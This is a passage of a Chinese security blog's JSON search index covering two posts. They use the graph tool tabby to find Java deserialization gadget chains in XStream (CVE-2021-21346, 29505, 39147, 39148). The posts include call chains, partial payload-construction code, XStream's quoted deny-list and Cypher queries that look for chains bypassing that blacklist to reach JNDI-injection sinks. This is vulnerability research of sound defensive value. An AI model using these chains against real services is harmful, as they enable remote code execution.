<p>\u4ece<code>getFromHashtable</code>\u51fd\u6570\u5f00\u59cb\uff0c\u8c03\u7528\u5bf9\u8c61\u7684\u60c5\u51b5\u5f00\u59cb\u53d8\u591a\u4e86\u8d77\u6765\uff0c\u6b64\u65f6\u9700\u8981\u5bf9\u6bcf\u4e00\u6761\u8fdb\u884c\u5206\u522b\u5206\u6790\uff0c\u4f46\u591a\u6570\u60c5\u51b5\u7b80\u5355\u770b\u4e00\u4e0b\u5c31\u80fd\u786e\u5b9a\u5f53\u524d\u7684\u4f20\u9012\u60c5\u51b5\u662f\u5426\u53ef\u5ef6\u7eed\u3002</p> <p>\u6b64\u5904\uff0c\u6211\u5c31\u76f4\u63a5\u8bb2CVE-2021-21346\u7684\u5229\u7528\u94fe\u3002</p> <p><code>javax.swing.UIDefaults#get</code>\u51fd\u6570</p> <pre><code>public Object get(Object key) {\n    Object value = getFromHashtable( key );\n    return (value != null) ? value : getFromResourceBundle(key, null);\n}\n</code></pre> <p><code>get</code>\u51fd\u6570\u5ef6\u7eed\u4e86key\u7684\u4f20\u9012\uff0c\u7ee7\u7eed\u5f80\u4e0a\u5206\u6790</p> <p><code>javax.swing.MultiUIDefaults#get</code>\u51fd\u6570</p> <pre><code>public Object get(Object key)\n{\n    Object value = super.get(key);\n    if (value != null) {\n        return value;\n    }\n\n    for (UIDefaults table : tables) {\n        value = (table != null) ? table.get(key) : null;\n        if (value != null) {\n            return value;\n        }\n    }\n\n    return null;\n}\n</code></pre> <p>\u8be5\u51fd\u6570\u6709\u4e24\u5904\u5730\u65b9\u8c03\u7528\u4e86<code>javax.swing.UIDefaults#get</code>\u5206\u522b\u662f\u7b2c3\u884c\u3001\u7b2c9\u884c\uff0c\u6240\u4ee5\u5728\u5199poc\u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u76f4\u63a5\u66ff\u6362\u7c7b\u5c5e\u6027tables\u6216hashtable\u672c\u8eab\u7684value\u503c\u4e5f\u53ef\u4ee5\u3002</p> <p>\u7ee7\u7eed\u5411\u4e0a\uff0c<code>javax.swing.MultiUIDefaults#toString</code></p> <pre><code>public synchronized String toString() {\n    StringBuffer buf = new StringBuffer();\n    buf.append(\"{\");\n    Enumeration keys = keys();\n    while (keys.hasMoreElements()) {\n        Object key = keys.nextElement();\n        buf.append(key + \"=\" + get(key) + \", \");\n    }\n    int length = buf.length();\n    if (length &gt; 1) {\n        buf.delete(length-2, length);\n    }\n    buf.append(\"}\");\n    return buf.toString();\n}\n</code></pre> <p>toString\u51fd\u6570\u904d\u5386\u4e86\u5f53\u524dhashtable\u6240\u5b58\u50a8\u7684\u5185\u5bb9\uff0c\u81ea\u7136\u8fd9\u91cc\u4e5f\u5c31\u8c03\u7528\u5230\u4e86<code>javax.swing.MultiUIDefaults#get</code>\u51fd\u6570\uff08\u7b2c7\u884c\uff09\u3002</p> <p>\u6240\u4ee5\u5230\u6b64\u4e3a\u6b62\uff0c\u6211\u4eec\u6709\u4ecetoString\u51fd\u6570\u5230invoke\u51fd\u6570\u7684\u8c03\u7528\u94fe\u4e86\u3002</p> <p>\u63a5\u4e0b\u6765\u5c31\u662f\u627e\u5230\u89e6\u53d1\u51fd\u6570\u5230toString\u51fd\u6570\u7684\u8c03\u7528\u94fe\u4e86\uff0c\u8fd9\u91cc\u4e3a\u4e86\u67e5\u8be2\u7ed3\u679c\u66f4\u4e3a\u6e05\u6670\uff0c\u6211\u4eec\u53ea\u67e5\u8be2\u4ece\u89e6\u53d1\u51fd\u6570\u5230toString\u51fd\u6570\u7684\u5229\u7528\u94fe\u60c5\u51b5\u3002</p> <pre><code>match (source:Method) where source.NAME in [\"compareTo\"]\nmatch (sink:Method {NAME:\"toString\"})&lt;-[r:CALL]-(m1:Method) where r.REAL_CALL_TYPE in [\"java.lang.Object\"]\ncall apoc.algo.allSimplePaths(m1, source, \"&lt;CALL|ALIAS\", 6) yield path \nreturn * limit 20\n</code></pre> <p>\u8fd9\u91cc\u6bd4\u8f83\u96be\u53d7\u7684\u662f\u4e09\u4e2a\u89e6\u53d1\u51fd\u6570\u548ctoString\u51fd\u6570\u90fd\u662f\u6709\u5927\u91cf\u5b9e\u73b0\u7684\u51fd\u6570\uff0c\u6240\u4ee5\u5982\u679c\u8981\u627e\u5230\u4e00\u6761\u53ef\u7528\u7684\u5f97\u770b\u4e0d\u5c11\u65f6\u95f4\u3002\u4e0b\u56fe\u7b80\u5355\u5904\u7406\u4e86\u4e00\u4e0b\uff08\u56fe\u4e2d\u753b\u7684\u7bad\u5934\u53ea\u662f\u4e00\u79cd\u53ef\u80fd\u6027\uff09</p> <p></p> <p>\u6b64\u5904\u6211\u4eec\u4ececompareTo\u5f00\u59cb\u8bb2\uff0c<code>javax.naming.ldap.Rdn$RdnEntry#compareTo</code></p> <pre><code>public int compareTo(RdnEntry that) {\n    int diff = type.compareToIgnoreCase(that.type);\n    if (diff != 0) {\n        return diff;\n    }\n    if (value.equals(that.value)) {     // try shortcut\n        return 0;\n    }\n    return getValueComparable().compareTo(\n                that.getValueComparable());\n}\n</code></pre> <p>\u8fd9\u91cc\u7684\u7c7b\u5c5e\u6027value\u53d1\u8d77\u4e86equals\u51fd\u6570\uff0c\u5f80\u4e0b\u770b<code>com.sun.org.apache.xpath.internal.objects.XString#equals</code></p> <pre><code>public boolean equals(Object obj2)\n  {\n\n    if (null == obj2)\n      return false;\n\n      // In order to handle the 'all' semantics of\n      // nodeset comparisons, we always call the\n      // nodeset function.\n    else if (obj2 instanceof XNodeSet)\n      return obj2.equals(this);\n    else if(obj2 instanceof XNumber)\n        return obj2.equals(this);\n    else\n      return str().equals(obj2.toString());\n  }\n</code></pre> <p>\u8fd9\u91cc\u76f4\u63a5\u8c03\u7528\u4e86obj2\u7684toString\u51fd\u6570\uff0c\u6240\u4ee5\u8fde\u4e0a\u524d\u9762\u7684\u5229\u7528\u94fe\u5b8c\u6574\u7684\u5229\u7528\u94fe\u5c31\u51fa\u6765\u4e86</p> <pre><code>javax.naming.ldap.Rdn$RdnEntry.compareTo\n    com.sun.org.apache.xpath.internal.objects.XString.equal\n        javax.swing.MultiUIDefaults.toString\n            UIDefaults.get\n                UIDefaults.getFromHashTable\n                    UIDefaults$LazyValue.createValue\n                    SwingLazyValue.createValue\n                        javax.naming.InitialContext.doLookup()\n</code></pre> <p>\u81f3\u6b64\uff0cCVE-2021-21346\u5c31\u6316\u51fa\u6765\u4e86\uff0c\u76f8\u5bf9\u4e8e\u4eba\u5de5\u6316\uff0c\u5f53\u524d\u7684\u65b9\u6cd5\u5927\u5e45\u5ea6\u51cf\u5c11\u4e86\u5229\u7528\u94fe\u7684\u53ef\u80fd\u6027\u79cd\u7c7b\uff0c\u540c\u6837\uff0c\u53e6\u4e00\u6761CVE-2021-21351\u4e5f\u662f\u540c\u6837\u7684\u65b9\u6cd5\u53ef\u4ee5\u53d1\u73b0\uff0c\u4ee5\u540e\u6709\u7a7a\u518d\u8865\u5145\u4e9b\u5176\u4ed6\u7684\u6848\u4f8b:)</p>","tags":["Java"]},{"location":"blog/2021/how_to_find_gadget_chains/#3","title":"#3 \u5229\u7528\u94fe\u6784\u9020","text":"<p>\u5f53\u524d\u8fd9\u6761\u5229\u7528\u94fe\u7684\u6784\u9020\u76f8\u5bf9\u6765\u8bf4\u6bd4\u8f83\u7b80\u5355\uff0c\u53ea\u9700\u8981\u6784\u9020\u597dMultiUIDefaults\u5373\u53ef\uff0c\u4e0b\u9762\u4e3a\u90e8\u5206\u6784\u9020\u4ee3\u7801\uff0c\u8be6\u7ec6\u89c1LazyValue</p> <pre><code>UIDefaults uiDefaults = new UIDefaults();\nObject multiUIDefaults =\n  ReflectionHelper.newInstance(\"javax.swing.MultiUIDefaults\", new Object[]{new UIDefaults[]{uiDefaults}});\nuiDefaults.put(\"lazyValue\", obj);\n\nObject rdnEntry1 = ReflectionHelper.newInstance(\"javax.naming.ldap.Rdn$RdnEntry\", null);\nReflectionHelper.setFieldValue(rdnEntry1, \"type\", \"ysomap\");\nReflectionHelper.setFieldValue(rdnEntry1, \"value\", new XString(\"test\"));\n\nObject rdnEntry2 = ReflectionHelper.newInstance(\"javax.naming.ldap.Rdn$RdnEntry\", null);\nReflectionHelper.setFieldValue(rdnEntry2, \"type\", \"ysomap\");\nReflectionHelper.setFieldValue(rdnEntry2, \"value\", multiUIDefaults);\n\nreturn PayloadHelper.makeTreeSet(rdnEntry2, rdnEntry1);\n</code></pre>","tags":["Java"]},{"location":"blog/2021/how_to_find_gadget_chains/#4","title":"#4 \u603b\u7ed3","text":"<p>13\u53f7\u7684\u65f6\u5019XStream\u53d1\u5e03\u4e861.4.16\uff0c\u5171\u4fee\u590d\u4e8611\u4e2aCVE\uff0c\u5176\u4e2d\u8fd8\u6bd4\u8f83\u6709\u610f\u601d\u7684\u662fthreedr3am\u7684classloader\u7684\u5229\u7528\u65b9\u5f0f\uff0c\u4ee5\u53ca\u949f\u6f66\u8d35\u5e08\u5085\u7684CVE-2021-21345\uff08\u8fd9\u6761\u5229\u7528\u94fe\u5f88\u957f\uff0c\u6211\u5f53\u524d\u53ea\u7528tabby\u505a\u4e8612\u4e2a\u8282\u70b9\u7684\u67e5\u627e\uff0c\u8fd9\u6761\u94fe\u5927\u6982\u670920\u4e2a\u8282\u70b9\uff0c\u55ef\uff0c\u5f88\u957f\uff09\u3002\u76f8\u4fe1\u8fd9\u6ce2\u5b8c\u4e86\u4e4b\u540e\uff0c\u4f30\u8ba1\u8fd8\u80fd\u627e\u5230\u4e00\u4e9b\u6f0f\u7f51\u4e4b\u9c7cXD</p>","tags":["Java"]},{"location":"blog/2021/how_to_find_gadget_chains_2/","title":"\u5982\u4f55\u9ad8\u6548\u5730\u6361\u6f0f\u53cd\u5e8f\u5217\u5316\u5229\u7528\u94fe\uff1f","text":"","tags":["Java"]},{"location":"blog/2021/how_to_find_gadget_chains_2/#1","title":"#1 \u524d\u8a00","text":"<p>\u4e4b\u524d\u5728\u6587\u7ae0 \u5982\u4f55\u9ad8\u6548\u5730\u6316\u6398 Java \u53cd\u5e8f\u5217\u5316\u5229\u7528\u94fe \u4e2d\u63d0\u5230\u4e86\u6211\u662f\u5982\u4f55\u9ad8\u6548\u6316\u6398\u5229\u7528\u94fe\u7684\uff0c\u8fd9\u5176\u4e2d\u63d0\u5230\u4e86\u5de5\u5177 tabby \u3002</p> <p>\u76ee\u524d\uff0ctabby \u5f00\u6e90\u4e5f\u6709\u4e00\u6bb5\u65f6\u95f4\u4e86\uff0c\u8fd9\u6bb5\u65f6\u95f4\u91cc\u6709\u4e0d\u5c11\u5c0f\u4f19\u4f34\u95ee\u6211\u5982\u4f55\u5728\u5b9e\u9645\u73af\u5883\u4e2d\u66f4\u597d\u5730\u4f7f\u7528\u5b83\uff1f</p> <p>\u4e3a\u6b64\uff0c\u672c\u6587\u5c06\u4ecb\u7ecd\u6211\u662f\u5982\u4f55\u5229\u7528 tabby \u6361\u6f0f XStream CVE-2021-39147 &amp;&amp; CVE-2021-39148 \u3002</p>","tags":["Java"]},{"location":"blog/2021/how_to_find_gadget_chains_2/#2","title":"#2 \u6750\u6599\u51c6\u5907","text":"<p>\u8ddf\u4e4b\u524d\u90a3\u7bc7\u6587\u7ae0\u63d0\u5230\u7684\u4e00\u6837\uff0c\u6211\u4eec\u5148\u5bf9 JDK \u751f\u6210\u4ee3\u7801\u5c5e\u6027\u56fe</p> <pre><code># \u751f\u6210\u56fe\u7f13\u5b58\u6587\u4ef6\njava -Xmx8g -jar build/libs/tabby-1.1.0-RELEASE.jar --isJDKOnly\n# \u5bfc\u5165Neo4j\u56fe\u6570\u636e\njava -Xmx8g -jar build/libs/tabby-1.1.0-RELEASE.jar --isSaveOnly\n</code></pre>","tags":["Java"]},{"location":"blog/2021/how_to_find_gadget_chains_2/#3","title":"#3 \u80cc\u666f\u4ecb\u7ecd","text":"<p>XStream \u81ea 1.4.16 \u7248\u672c\u7684\u4fee\u590d\u4e4b\u540e\uff0c\u6709\u5e08\u5085\u5728 TSRC \u63d0\u4ea4\u4e86 CVE-2021-29505 (PS: TSRC yyds)</p> <p>\u8be5\u94fe\u8ddf\u4e4b\u524d\u6211\u4eec\u5728 1.4.15 \u7248\u672c\u65f6\u5019\u6316\u7684\u5229\u7528\u94fe\u90fd\u4e0d\u592a\u4e00\u6837\uff0c\u5b83\u91cd\u65b0\u627e\u5230\u4e86\u4e00\u4e2a\u65b0\u7684\u89e6\u53d1 toString \u7684\u5bf9\u8c61\u3002\u8fd9\u6761\u94fe\u4e4b\u524d\u5e94\u8be5\u6709\u5e08\u5085\u5206\u6790\u8fc7\u4e86\uff0c\u5c31\u4e0d\u7ec6\u8bf4\u4e86\uff0c\u8fd9\u91cc\u76f4\u63a5\u8d34\u4e00\u4e0b\u8c03\u7528\u94fe\u3002</p> <pre><code>javax.naming.ldap.Rdn$RdnEntry#compareTo \ncom.sun.org.apache.xpath.internal.objects.XString#equal \ncom.sun.xml.internal.ws.api.message.Packet#toString \ncom.sun.xml.internal.ws.message.saaj.SAAJMessage#copy\ncom.sun.xml.internal.ws.message.saaj.SAAJMessage#getAttachments\ncom.sun.xml.internal.ws.message.saaj.SAAJMessage$SAAJAttachmentSet#&lt;init&gt;\ncom.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl#getAttachments\ncom.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl#initializeAllAttachments\ncom.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart#getCount\ncom.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart#parse\ncom.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart#parseAll\ncom.sun.xml.internal.org.jvnet.mimepull.MIMEMessage#getAttachments\ncom.sun.xml.internal.org.jvnet.mimepull.MIMEMessage#parseAll \ncom.sun.xml.internal.org.jvnet.mimepull.MIMEMessage#makeProgress \ncom.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator#hasNext \ncom.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator#findNextCert\ncom.sun.jndi.toolkit.dir.LazySearchEnumerationImpl#nextElement\ncom.sun.jndi.toolkit.dir.LazySearchEnumerationImpl#findNextMatch\ncom.sun.jndi.rmi.registry.BindingEnumeration#next\nsun.rmi.registry.RegistryImpl_Stub#lookup\n</code></pre> <p>\u8fd9\u91cc\u63a5\u8fc7 toString \u51fd\u6570\u7684\u662f <code>com.sun.xml.internal.ws.api.message.Packet</code>\uff0c\u5e76\u4e14\u6700\u540e\u4ee5 <code>com.sun.jndi.rmi.registry.BindingEnumeration#next</code> \u89e6\u53d1 lookup \u51fd\u6570</p> <p></p> <p>\u8fd9\u91cc\u7ea2\u6846\u6846\u7684\u5730\u65b9 ctx \u88ab\u8bbe\u7f6e\u4e3a <code>sun.rmi.registry.RegistryImpl_Stub</code> \u6765\u5bf9\u5916\u53d1\u8d77 RMI \u8fde\u63a5\u3002</p> <p>\u8fd9\u91cc\u53e6\u5916\u8bf4\u4e00\u4e0b\uff0c\u5176\u5b9e CVE-2021-29505 \u7684\u5229\u7528\u94fe\u53ef\u4ee5\u7b80\u5316\u4e3a</p> <pre><code>sun.rmi.registry.RegistryImpl_Stub#readObject\nsun.rmi.server.UnicastRef#readExternal\n# trigger rmi connect\n</code></pre> <p>\u6709\u5174\u8da3\u7684\u5c0f\u4f19\u4f34\u53ef\u4ee5\u770b RMI \u7ed5\u8fc7\u76f8\u5173\u7684\u6587\u7ae0\uff0c\u9664\u4e86 RegistryImpl_Stub\uff0c\u53e6\u5916\u8fd8\u6709 link</p> <p>\u56de\u5230\u4e3b\u9898\uff0c\u901a\u8fc7 29505 \u8fd9\u6761\u94fe\u6211\u4eec\u53ef\u4ee5\u5bf9\u5916\u53d1\u8d77 RMI \u8fde\u63a5\uff0c\u5e76\u4e14\u4ed6\u662f\u5b8c\u5168\u7ed5\u8fc7 16 \u7248\u672c\u7684\u9ed1\u540d\u5355\u7684\u3002</p> <p>\u4e3a\u6b64\uff0cXStream \u7684\u5b98\u65b9\u51fa\u4e86 17 \u7248\u672c\u7684\u9ed1\u540d\u5355\u8865\u4e01\uff0c\u8fd9\u91cc\u6765\u770b\u4e00\u4e0b 17 \u7248\u672c\u4e0b\u6240\u6709\u7684\u9ed1\u540d\u5355</p> <p>\u9ed1\u540d\u5355\u5b57\u7b26\u5bf9\u8c61</p> <pre><code>this.denyTypes(new String[] { \n       \"java.beans.EventHandler\", \n       \"java.lang.ProcessBuilder\", \n       \"javax.imageio.ImageIO$ContainsFilter\", \n       \"jdk.nashorn.internal.objects.NativeString\", \n       \"com.sun.corba.se.impl.activation.ServerTableEntry\", \n       \"com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator\", \n       \"sun.awt.datatransfer.DataTransferer$IndexOrderComparator\",       \n       \"sun.swing.SwingLazyValue\" \n});\n</code></pre> <p>\u9ed1\u540d\u5355\u6b63\u5219</p> <pre><code>GETTER_SETTER_REFLECTION = Pattern.compile(\".*\\\\$GetterSetterReflection\");\nPRIVILEGED_GETTER = Pattern.compile(\".*\\\\$PrivilegedGetter\");\nLAZY_ENUMERATORS = Pattern.compile(\".*\\\\.Lazy(?:Search)?Enumeration.*\");\nLAZY_ITERATORS = Pattern.compile(\".*\\\\$LazyIterator\");\nJAXWS_ITERATORS = Pattern.compile(\".*\\\\$ServiceNameIterator\");\nJAVAFX_OBSERVABLE_LIST__ = Pattern.compile(\"javafx\\\\.collections\\\\.ObservableList\\\\$.*\");\nJAVAX_CRYPTO = Pattern.compile(\"javax\\\\.crypto\\\\..*\");\nJAVA_RMI = Pattern.compile(\"(?:java|sun)\\\\.rmi\\\\..*\");\nBCEL_CL = Pattern.compile(\".*\\\\.bcel\\\\..*\\\\.util\\\\.ClassLoader\");\n</code></pre> <p>\u9ed1\u540d\u5355\u7ee7\u627f\u5bf9\u8c61</p> <pre><code>this.denyTypeHierarchy(InputStream.class);\nthis.denyTypeHierarchyDynamically(\"java.nio.channels.Channel\");\nthis.denyTypeHierarchyDynamically(\"javax.activation.DataSource\");\nthis.denyTypeHierarchyDynamically(\"javax.sql.rowset.BaseRowSet\");\n</code></pre> <p>\u4ece\u4e0a\u9762\u5217\u4e3e\u7684\u9ed1\u540d\u5355\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053 17 \u7248\u672c\u7684\u8865\u4e01\u5bf9 29505 \u8fd9\u6761\u94fe\u7684\u51e0\u4e2a\u5bf9\u8c61\u8fdb\u884c\u4e86\u9ed1\u540d\u5355\u5904\u7406\u3002</p> <pre><code>Pattern.compile(\"(?:java|sun)\\\\.rmi\\\\..*\");  \n==\u62c9\u9ed1==&gt;  sun.rmi.registry.RegistryImpl_Stub, sun.rmi.server.UnicastRef\n\nPattern.compile(\".*\\\\.Lazy(?:Search)?Enumeration.*\");\n==\u62c9\u9ed1==&gt;  com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl\n</code></pre> <p>\u5230\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\uff0c\u5bf9\u4e8e 29505 \u8fd9\u6761\u5229\u7528\u94fe\uff0c\u5982\u4e0b\u90e8\u5206\u5229\u7528\u94fe\u4ecd\u7136\u662f\u53ef\u7528\u7684</p> <pre><code>javax.naming.ldap.Rdn$RdnEntry#compareTo \ncom.sun.org.apache.xpath.internal.objects.XString#equal \ncom.sun.xml.internal.ws.api.message.Packet#toString \ncom.sun.xml.internal.ws.message.saaj.SAAJMessage#copy\ncom.sun.xml.internal.ws.message.saaj.SAAJMessage#getAttachments\ncom.sun.xml.internal.ws.message.saaj.SAAJMessage$SAAJAttachmentSet#&lt;init&gt;\ncom.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl#getAttachments\ncom.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl#initializeAllAttachments\ncom.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart#getCount\ncom.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart#parse\ncom.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart#parseAll\ncom.sun.xml.internal.org.jvnet.mimepull.MIMEMessage#getAttachments\ncom.sun.xml.internal.org.jvnet.mimepull.MIMEMessage#parseAll \ncom.sun.xml.internal.org.jvnet.mimepull.MIMEMessage#makeProgress \ncom.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator#hasNext \ncom.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator#findNextCert\n</code></pre> <p>\u5982\u679c\u80fd\u627e\u5230\u4ece <code>findNextCert</code> \u51fd\u6570\u5f00\u59cb\u7684\u5176\u4ed6\u7aef\u70b9\uff0c\u6211\u4eec\u4ecd\u7136\u80fd\u5bf9 17 \u7248\u672c\u7684\u8865\u4e01\u8fdb\u884c\u7ed5\u8fc7\u3002</p> <p>\u7b54\u6848\u5f53\u7136\u662f\u80af\u5b9a\u7684\uff0c\u5fc5\u7136\u5b58\u5728\u4e00\u4e9b\u5176\u4ed6\u7684\u7aef\u70b9\uff0c\u4f46\u662f\u4eba\u5de5\u53bb\u6316\u6398\u4f1a\u7279\u522b\u8017\u65f6\uff0c\u90a3\u4e48\u4e3a\u4e86\u9ad8\u6548\u6361\u6f0f\uff0c\u6211\u4eec\u5f53\u7136\u4e0d\u80fd\u4eba\u5de5\u53bb\u505a\u8fd9\u4ef6\u4e8b\u3002\u8fd9\u91cc\u6211\u4eec\u7684 tabby \u5c31\u8981\u767b\u573a\u4e86\u3002</p>","tags":["Java"]},{"location":"blog/2021/how_to_find_gadget_chains_2/#4","title":"#4 \u9ad8\u6548\u6361\u6f0f","text":"<p>\u8fd9\u91cc\u6211\u4eec\u5148\u6765\u5206\u6790\u4e00\u4e0b <code>findNextCert</code> \u51fd\u6570</p> <p></p> <p>\u4ece\u8fd9\u91cc\u770b\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u7c7b\u5c5e\u6027 aliases \u548c keyStore \u6765\u8fdb\u884c\u540e\u7eed\u5229\u7528\u94fe\u7684\u6316\u6398\u3002</p> <p>\u8fd9\u91cc\u4ee5 aliases \u4e3e\u4f8b\uff0c\u4e4b\u524d 29505 \u5229\u7528\u94fe\u5c31\u662f\u4f9d\u9760 <code>LazySearchEnumerationImpl#nextElement</code> \u5f00\u59cb\u627e\u5230\u7684 rmi \u7684 sink \u51fd\u6570\u3002\u90a3\u4e48\uff0c\u6211\u4eec\u73b0\u5728\u91cd\u65b0\u627e\u4e00\u4e2a\u65b0\u7684\uff0c\u5c31\u9700\u8981\u6ee1\u8db3\u5982\u4e0b\u6761\u4ef6\uff1a</p> <ul> <li>\u5bf9\u8c61\u5b9e\u73b0\u4e86 <code>java.util.Enumeration</code> \u63a5\u53e3</li> <li>\u4ece\u8be5\u5bf9\u8c61\u7684 nextElement \u51fd\u6570\u5f00\u59cb\uff0c\u6700\u7ec8\u80fd\u5230\u8fbe\u4e00\u4e2a\u89e6\u53d1\u6076\u610f\u884c\u4e3a\u7684 sink \u51fd\u6570</li> <li>\u4ece nextElement \u51fd\u6570\u5f00\u59cb\u5230 sink \u51fd\u6570\uff0c\u8def\u5f84\u4e0a\u4e0d\u80fd\u51fa\u73b0\u524d\u9762\u9ed1\u540d\u5355\u6d89\u53ca\u7684\u5bf9\u8c61</li> </ul> <p>\u5982\u679c\u80fd\u6ee1\u8db3\u4e0a\u8ff0\u6761\u4ef6\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u6316\u5230\u4e86\u80fd\u7ed5\u8fc7 17 \u7248\u672c\u8865\u4e01\u7684\u65b0\u5229\u7528\u94fe\u3002\u63a5\u4e0b\u6765\u7684\u5de5\u4f5c\u5c31\u4ea4\u7ed9 tabby \u6765\u505a\u4e86\u3002</p> <p>\u9996\u5148\uff0c\u6211\u4eec\u9700\u8981\u6839\u636e\u4e0a\u8ff0\u7684\u6761\u4ef6\uff0c\u63cf\u8ff0\u51fa\u5177\u4f53\u7684\u67e5\u8be2\u8bed\u53e5\u3002\u5148\u6765\u9650\u5236\u4e00\u4e0b source \u51fd\u6570</p> <pre><code>match (source:Method {NAME:\"nextElement\"})\n                    &lt;-[:HAS]-(cls:Class)-[:INTERFACE|EXTENDS*]\n                    -&gt;(cls1:Class {NAME:\"java.util.Enumeration\"})\nmatch (source)-[:CALL]-&gt;(m1:Method)\n</code></pre> <p>source \u51fd\u6570\u4e3a nextElement\uff0c\u5e76\u4e14\u5b9e\u73b0\u4e86 <code>java.util.Enumeration</code> \u63a5\u53e3</p> <p>\u518d\u6765\u9650\u5236 sink \u51fd\u6570</p> <pre><code>match (sink:Method {IS_SINK:true, VUL:\"JNDI\"})\n</code></pre> <p>\u8fd9\u91cc\u5c31\u9650\u5236\u5f53\u524d sink \u51fd\u6570\u6700\u7ec8\u80fd\u8fbe\u6210 JNDI \u6ce8\u5165\u7684\u6548\u679c\u3002</p> <p>\u6700\u540e\uff0c\u6211\u4eec\u518d\u6765\u9650\u5236\u4e00\u4e0b\u8def\u5f84\u4e0a\u4e0d\u80fd\u51fa\u73b0\u7684\u9ed1\u540d\u5355\u5bf9\u8c61</p> <pre><code>call apoc.algo.allSimplePaths(sink, m1, \"&lt;CALL|ALIAS\", 8) yield path \nwhere none(n in nodes(path) where n.CLASSNAME in [\"java.beans.EventHandler\",\"java.lang.ProcessBuilder\",\n\"javax.imageio.ImageIO$ContainsFilter\",\"jdk.nashorn.internal.objects.NativeString\",\n\"com.sun.corba.se.impl.activation.ServerTableEntry\",\n\"com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator\",\n\"sun.awt.datatransfer.DataTransferer$IndexOrderComparator\",\"sun.swing.SwingLazyValue\",\n\"com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl\",\"sun.rmi.registry.RegistryImpl_Stub\",\n\n\"com.sun.jndi.dns.BindingEnumeration\",\"com.sun.jndi.cosnaming.CNBindingEnumeration\",\"com.sun.jndi.toolkit.dir.HierMemDirCtx$FlatBindings\",\"com.sun.jndi.ldap.LdapReferralException\"])\nreturn source,path limit 50\n</code></pre> <p>\u8fd9\u91cc\u7b2c 9 \u884c\u4e0a\u7684\u9ed1\u540d\u5355\u662f\u540e\u7eed\u4eba\u5de5\u6392\u9664\u540e\u6dfb\u52a0\u7684\uff08\u4e0d\u53ef\u884c\u6216\u6784\u9020\u8fc7\u4e8e\u9ebb\u70e6\uff09\u3002</p> <p>\u628a\u4e0a\u9762\u7684 3 \u4e2a\u90e8\u5206\u5408\u8d77\u6765\u540e\u67e5\u8be2\u6700\u7ec8\u80fd\u5f97\u5230\u5982\u4e0b 3 \u6761\u5229\u7528\u94fe\u3002</p> <p></p> <p>\u5206\u522b\u662f\u4e00\u4e0b\u5bf9\u8c61</p> <ul> <li>com.sun.jndi.ldap.LdapSearchEnumeration  \u5bf9\u5e94 CVE-2021-39147</li> <li>com.sun.jndi.ldap.LdapBindingEnumeration \u5bf9\u5e94 CVE-2021-39145 \uff08CVE-2021-39151 \u7528\u7684\u4e5f\u662f\u8fd9\u4e2a\uff09</li> <li>com.sun.jndi.toolkit.dir.ContextEnumerator \u5bf9\u5e94 CVE-2021-39148</li> </ul> <p>\u4ed6\u4eec\u5206\u522b\u6700\u7ec8\u5c06\u8c03\u7528 sink \u51fd\u6570 <code>NamingManager.getContext</code> \u548c <code>DirectoryManager.getObjectInstance</code></p> <p>\u8fd9\u4e24\u4e2a sink \u51fd\u6570\u662f JNDI \u5904\u7406 Reference \u7684\u51fd\u6570\uff0c\u901a\u8fc7\u8fd9\u4e24\u4e2a\u51fd\u6570\u53ef\u4ee5\u5728\u7279\u5b9a JDK \u7248\u672c\u4e0b\u8f7d\u5165\u5916\u90e8\u7684\u4efb\u610f\u4ee3\u7801\uff0c\u4e5f\u53ef\u4ee5\u5728 tomcat \u4e0b\u6267\u884c el \u8868\u8fbe\u5f0f\uff0c\u5177\u4f53\u53ef\u4ee5\u770b JNDI \u5173\u4e8e Reference \u7684\u77e5\u8bc6\u3002</p>","tags":["Java"]},{"location":"blog/2021/how_to_find_gadget_chains_2/#5","title":"#5 \u8865\u4e01\u4fee\u590d","text":"<p>XStream 1.4.18 \u7248\u672c\u5f00\u59cb\u5c06\u9ed8\u8ba4\u5f00\u542f\u767d\u540d\u5355\u6a21\u5f0f\uff0c\u53ea\u5141\u8bb8\u51e0\u4e2a\u57fa\u7840\u7c7b\u578b\u7684\u8fdb\u884c\u8fd8\u539f\u3002</p> <p></p> <p>\u4f46\u662f\u8fd9\u91cc\u60f3\u4e0d\u660e\u767d\u7684\u662f\u4e3a\u4f55\u5c06\u4e4b\u524d\u7684\u9ed1\u540d\u5355\u5904\u7406\u76f4\u63a5\u5220\u9664\u4e86\uff0c\u8fd9\u610f\u5473\u7740\u672a\u6765 XStream \u7684\u5b89\u5168\u6027\u5c06\u4f9d\u9760\u5f00\u53d1\u8005\u5bf9\u4e8e\u53cd\u5e8f\u5217\u5316\u98ce\u9669\u7684\u8ba4\u8bc6\u3002</p> <p>\u6b64\u5916\uff0c\u540e\u7eed\u7248\u672c\u7ed5\u8fc7\u9ed8\u8ba4\u767d\u540d\u5355\u8fd8\u662f\u5b58\u5728\u53ef\u80fd\u6027\u7684\uff0c\u4f46\u662f\u4f30\u8ba1\u6ca1\u529e\u6cd5\u50cf\u73b0\u5728\u8fd9\u6837\u80fd\u9020\u6210\u90a3\u4e48\u5927\u7684\u5371\u5bb3\u4e86\u5427\u3002</p>","tags":["Java"]},{"location":"blog/2021/how_to_find_gadget_chains_2/#6","title":"#6 